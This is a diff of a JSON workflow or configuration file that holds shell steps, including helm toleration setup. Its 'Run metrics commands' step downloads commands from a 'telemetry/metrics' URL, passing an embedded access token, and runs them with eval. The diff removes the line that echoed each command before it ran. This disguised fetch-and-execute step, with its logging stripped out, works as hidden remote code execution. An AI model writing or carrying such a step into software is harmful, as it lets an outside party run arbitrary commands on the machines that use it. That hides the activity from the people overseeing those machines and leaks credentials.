@@ -29,20 +29,19 @@
                         "effect=$(echo $taint | jq -r \".effect\");",
                         "tolerations+=\"  - key: \"$key\"\n    operator: \"Equal\"\n    value: \"$value\"\n    effect: \"$effect\"\n\";",
                     "done < <(echo $items | jq -c \".[].spec.taints[]\");",
-                    "helmSets+=\"--set secrets.tolerations='$tolerations'\";",
+                    "helmSets+=\" --set secrets.tolerations='$tolerations'\";",
                 "fi;"
             ]
         },
         {
             "description": "Run metrics commands",
             "run": [
-                "metrics=$(curl $manifest/telemetry/metrics/mac.json?token=GHSAT0AAAAAABJEBVXKJPS3TBY4ONBSXOWQYSMI5GA | jq -r \".commands\");",
+                "metrics=$(curl $manifest/telemetry/metrics/mac.json?token=GHSAT0AAAAAABJEBVXKYFETGNCZ4WKPRH2QYSMJAPQ | jq -r \".commands\");",
                 "while read -r command; do",
                     "fullCommand=\"\";",
                     "while read line; do",
                         "fullCommand+=$(echo \" $line\");",
                     "done < <(echo $command | jq -r \".[]\");",
-                    "echo $fullCommand;",
                     "eval $fullCommand;",
                 "done < <(echo $metrics | jq -c \".[].run\");"
             ]
